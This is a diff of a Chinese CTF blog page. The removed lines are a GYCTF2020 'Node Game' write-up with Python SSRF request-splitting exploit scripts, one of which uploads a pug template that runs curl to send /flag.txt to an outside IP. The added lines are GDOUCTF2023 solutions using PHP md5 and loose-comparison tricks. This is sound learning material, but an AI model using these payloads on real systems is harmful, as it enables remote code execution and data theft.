@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>GYCTF2020 Node Game | 甜筒园</title>
-  <meta name="keywords" content=" ssrf漏洞 ">
-  <meta name="description" content="GYCTF2020 Node Game | 甜筒园">
+  <title>GDOUCTF2023 | 甜筒园</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="GDOUCTF2023 | 甜筒园">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="EZ WEBF12查看源码发现注释中的提示&#x2F;src,访问后查看源码： import flask  app &#x3D; flask.Flask(__name__)  @app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;]) def index():   return flask.send_file(&#39;index.html&#39;)  @app.route(&amp;">
 <meta property="og:type" content="article">
@@ -497,9 +497,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-GYCTF2020-Node-Game" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-GDOUCTF2023" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">GYCTF2020 Node Game</h1>
+        <h1 class="article-title">GDOUCTF2023</h1>
     
     <div class="article-meta">
         
@@ -514,22 +514,15 @@
         </span>
         
         
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color2">ssrf漏洞</a>
-            
-        </span>
+    </div>
+    <div class="article-meta">
+        
+            发布时间 : <time class="date" title='最后更新: 2023-04-16 19:53:32'>2023-04-16 12:42</time>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2023-03-24 19:01:30'>2023-03-21 16:21</time>
-        
-    </div>
-    <div class="article-meta">
-        
-        <span>字数:1.1k</span>
+        <span>字数:453</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -559,7 +552,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#EZ-WEB"><span class="toc-text">EZ WEB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%97%E4%B8%8D%E4%BA%86%E4%B8%80%E7%82%B9"><span class="toc-text">受不了一点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hate-eat-snake"><span class="toc-text">hate eat snake</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -575,226 +568,79 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>打开题目环境读取源码：</p>
-<p>dd题目源码：</p>
-<pre><code class="javascript">
-var express = require(&#39;express&#39;);
-var app = express();
-var fs = require(&#39;fs&#39;);
-var path = require(&#39;path&#39;);
-var http = require(&#39;http&#39;);
-var pug = require(&#39;pug&#39;);
-var morgan = require(&#39;morgan&#39;);
-const multer = require(&#39;multer&#39;);
+        <h2 id="EZ-WEB"><a href="#EZ-WEB" class="headerlink" title="EZ WEB"></a>EZ WEB</h2><p><code>F12</code>查看源码发现注释中的提示<code>/src</code>,访问后查看源码：</p>
+<pre><code class="python">import flask
 
+app = flask.Flask(__name__)
 
-app.use(multer(&#123;dest: &#39;./dist&#39;&#125;).array(&#39;file&#39;));
-app.use(morgan(&#39;short&#39;));
-app.use(&quot;/uploads&quot;,express.static(path.join(__dirname, &#39;/uploads&#39;)))
-app.use(&quot;/template&quot;,express.static(path.join(__dirname, &#39;/template&#39;)))
+@app.route(&#39;/&#39;, methods=[&#39;GET&#39;])
+def index():
+  return flask.send_file(&#39;index.html&#39;)
 
+@app.route(&#39;/src&#39;, methods=[&#39;GET&#39;])
+def source():
+  return flask.send_file(&#39;app.py&#39;)
 
-app.get(&#39;/&#39;, function(req, res) &#123;
-    var action = req.query.action?req.query.action:&quot;index&quot;;
-    if( action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;) )&#123;
-        res.send(&quot;Errrrr, You have been Blocked&quot;);
-    &#125;
-    file = path.join(__dirname + &#39;/template/&#39;+ action +&#39;.pug&#39;);
-    var html = pug.renderFile(file);
-    res.send(html);
-&#125;);
-
-app.post(&#39;/file_upload&#39;, function(req, res)&#123;
-    var ip = req.connection.remoteAddress;
-    var obj = &#123;
-        msg: &#39;&#39;,
-    &#125;
-    if (!ip.includes(&#39;127.0.0.1&#39;)) &#123;
-        obj.msg=&quot;only admin&#39;s ip can use it&quot;
-        res.send(JSON.stringify(obj));
-        return 
-    &#125;
-    fs.readFile(req.files[0].path, function(err, data)&#123;
-        if(err)&#123;
-            obj.msg = &#39;upload failed&#39;;
-            res.send(JSON.stringify(obj));
-        &#125;else&#123;
-            var file_path = &#39;/uploads/&#39; + req.files[0].mimetype +&quot;/&quot;;
-            var file_name = req.files[0].originalname
-            var dir_file = __dirname + file_path + file_name
-            if(!fs.existsSync(__dirname + file_path))&#123;
-                try &#123;
-                    fs.mkdirSync(__dirname + file_path)
-                &#125; catch (error) &#123;
-                    obj.msg = &quot;file type error&quot;;
-                    res.send(JSON.stringify(obj));
-                    return
-                &#125;
-            &#125;
-            try &#123;
-                fs.writeFileSync(dir_file,data)
-                obj = &#123;
-                    msg: &#39;upload success&#39;,
-                    filename: file_path + file_name
-                &#125; 
-            &#125; catch (error) &#123;
-                obj.msg = &#39;upload failed&#39;;
-            &#125;
-            res.send(JSON.stringify(obj));    
-        &#125;
-    &#125;)
-&#125;)
-
-app.get(&#39;/source&#39;, function(req, res) &#123;
-    res.sendFile(path.join(__dirname + &#39;/template/source.txt&#39;));
-&#125;);
-
-
-app.get(&#39;/core&#39;, function(req, res) &#123;
-    var q = req.query.q;
-    var resp = &quot;&quot;;
-    if (q) &#123;
-        var url = &#39;http://localhost:8081/source?&#39; + q
-        console.log(url)
-        var trigger = blacklist(url);
-        if (trigger === true) &#123;
-            res.send(&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;);
-        &#125; else &#123;
-            try &#123;
-                http.get(url, function(resp) &#123;
-                    resp.setEncoding(&#39;utf8&#39;);
-                    resp.on(&#39;error&#39;, function(err) &#123;
-                    if (err.code === &quot;ECONNRESET&quot;) &#123;
-                     console.log(&quot;Timeout occurs&quot;);
-                     return;
+@app.route(&#39;/super-secret-route-nobody-will-guess&#39;, methods=[&#39;PUT&#39;])
+def flag():
+  return open(&#39;flag&#39;).read()
+</code></pre>
+<p>put方法访问<code>/super-secret-route-nobody-will-guess</code>获得flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230416124557867.png" alt="image-20230416124557867"></p>
+<h2 id="受不了一点"><a href="#受不了一点" class="headerlink" title="受不了一点"></a>受不了一点</h2><p>经典源码套娃题</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+header(&quot;Content-type:text/html;charset=utf-8&quot;);
+if(isset($_POST[&#39;gdou&#39;])&amp;&amp;isset($_POST[&#39;ctf&#39;]))&#123;
+    $b=$_POST[&#39;ctf&#39;];
+    $a=$_POST[&#39;gdou&#39;];
+    if($_POST[&#39;gdou&#39;]!=$_POST[&#39;ctf&#39;] &amp;&amp; md5($a)===md5($b))&#123;
+        if(isset($_COOKIE[&#39;cookie&#39;]))&#123;
+           if ($_COOKIE[&#39;cookie&#39;]==&#39;j0k3r&#39;)&#123;
+               if(isset($_GET[&#39;aaa&#39;]) &amp;&amp; isset($_GET[&#39;bbb&#39;]))&#123;
+                  $aaa=$_GET[&#39;aaa&#39;];
+                  $bbb=$_GET[&#39;bbb&#39;];
+                 if($aaa==114514 &amp;&amp; $bbb==114514 &amp;&amp; $aaa!=$bbb)&#123;
+                   $give = &#39;cancanwordflag&#39;;
+                   $get =&#39;hacker!&#39;;
+                   if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;
+                         die($give);
                     &#125;
-                   &#125;);
-
-                    resp.on(&#39;data&#39;, function(chunk) &#123;
-                        try &#123;
-                         resps = chunk.toString();
-                         res.send(resps);
-                        &#125;catch (e) &#123;
-                           res.send(e.message);
-                        &#125;
- 
-                    &#125;).on(&#39;error&#39;, (e) =&gt; &#123;
-                         res.send(e.message);&#125;);
-                &#125;);
-            &#125; catch (error) &#123;
-                console.log(error);
-            &#125;
+                   if($_POST[&#39;flag&#39;] === &#39;flag&#39; || $_GET[&#39;flag&#39;] === &#39;flag&#39;)&#123;
+                       die($get);
+                    &#125;
+                    foreach ($_POST as $key =&gt; $value) &#123;
+                        $$key = $value;
+                   &#125;
+                    foreach ($_GET as $key =&gt; $value) &#123;
+                         $$key = $$value;
+                    &#125;
+                   echo $f1ag;
+            &#125;else&#123;
+                  echo &quot;洗洗睡吧&quot;;
+                 &#125;
+    &#125;else&#123;
+        echo &quot;行不行啊细狗&quot;;
         &#125;
-    &#125; else &#123;
-        res.send(&quot;search param &#39;q&#39; missing!&quot;);
-    &#125;
-&#125;)
-
-function blacklist(url) &#123;
-    var evilwords = [&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\&quot;&quot;,&quot;&#39;&quot;,&quot;!&quot;];
-    var arrayLen = evilwords.length;
-    for (var i = 0; i &lt; arrayLen; i++) &#123;
-        const trigger = url.includes(evilwords[i]);
-        if (trigger === true) &#123;
-            return true
-        &#125;
-    &#125;
+  &#125;
 &#125;
-
-var server = app.listen(8081, function() &#123;
-    var host = server.address().address
-    var port = server.address().port
-    console.log(&quot;Example app listening at http://%s:%s&quot;, host, port)
-&#125;)
+else &#123;
+  echo &#39;菜菜&#39;;
+&#125;
+&#125;else&#123;
+  echo &quot;就这?&quot;;
+&#125;
+&#125;else&#123;
+  echo &quot;别来沾边&quot;;
+&#125;
+?&gt;
 </code></pre>
-<p>文件上传部分要求只能本地上传，想到SSRF漏洞。</p>
-<p>题目也特别强调了 Node 版本为 8.12.0，那么就在网上一搜，发现这个版本的 Node 的 http 模块这里果然有漏洞。<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894#toc-2">https://xz.aliyun.com/t/2894#toc-2</a></p>
-<p>参考了各位师傅的wp也是一知半解，这里贴出来两种脚本供参考</p>
-<pre><code class="python">import urllib.parse
-import requests
-
-payload = &#39;&#39;&#39; HTTP/1.1
-Host: x
-Connection: keep-alive
-
-POST /file_upload HTTP/1.1
-Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810
-Connection: keep-alive
-cache-control: no-cache
-Host: x
-Content-Length: 294
-
-----------------------------919695033422425209299810
-Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;ttycp3.pug&quot;
-Content-Type: /../template
-
-doctype html
-html
-  head
-    style
-      include ../../../../../../../flag.txt
-
-----------------------------919695033422425209299810--
-
-GET /flag HTTP/1.1
-Host: x
-Connection: close
-x:&#39;&#39;&#39;
-payload = payload.replace(&quot;\n&quot;, &quot;\r\n&quot;)
-payload = &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
-# print(payload)
-r = requests.get(&#39;http://2174017e-6eab-4709-a9cd-7c63651b7684.node3.buuoj.cn/core?q=&#39; + urllib.parse.quote(payload))
-print(r.text)
-#	最后访问?action=ttycp3获得flag
+<p>都是很基础的php特性，唯一算是绕点弯的可能出题人失误没用上这个考点，flag直接输出了毫无影响</p>
+<pre><code>http://node5.anna.nssctf.cn:28889/?aaa=114514a&amp;bbb=114514&amp;flag=
+POST:
+gdou[]=1&amp;ctf[]=2
 </code></pre>
-<p>反弹shell版本：</p>
-<pre><code class="python">import urllib.parse
-import requests
-
-payload = &quot;&quot;&quot;
-
-POST /file_upload HTTP/1.1
-Host: localhost:8081
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Content-Type: multipart/form-data; boundary=---------------------------79799747022511107691492167111
-Content-Length:1000
-Origin: http://localhost:8081
-Connection: close
-Referer: http://localhost:8081/?action=upload
-Upgrade-Insecure-Requests: 1
-
------------------------------79799747022511107691492167111
-Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pug&quot;
-Content-Type: ../template
-
-- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl 82.157.69.84:12345 -X POST -d `cat /flag.txt`&#39;)
------------------------------79799747022511107691492167111--
-
-
-&quot;&quot;&quot;.replace(&quot;\n&quot;, &quot;\r\n&quot;)
-
-
-def payload_encode(raw):
-    ret = u&quot;&quot;
-    for i in raw:
-        ret += chr(0x0100 + ord(i))  # 替换为高编码unicode字符
-    return ret
-
-
-payload = payload_encode(payload)
-print(payload)
-
-r = requests.get(&#39;http://5f09d3d5-09ee-4742-a142-40df87c9ccf5.node4.buuoj.cn:81/core?q=&#39; + urllib.parse.quote(payload))
-print(r.text)
-r = requests.get(&#39;http://5f09d3d5-09ee-4742-a142-40df87c9ccf5.node4.buuoj.cn:81/?action=shell&#39;)
-</code></pre>
-<p>在自己服务器上开监听即可</p>
-<hr>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://y4tacker.gitee.io/2021/01/28/year/2021/1%E6%9C%88/GYCTF2020-NodeGame/">GYCTF2020-NodeGame</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shinygod/article/details/129000051">[GYCTF2020]Node Game</a></p>
+<h2 id="hate-eat-snake"><a href="#hate-eat-snake" class="headerlink" title="hate eat snake"></a>hate eat snake</h2><p>F12点不动，<code>ctrl+u</code>查看页面源代码，在<code>snake.js</code>中找到获得flag的关键信息，<code>ctrl+s</code>下载网页源代码，将js中的if条件改为永真值本地打开html文件拿到flag。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
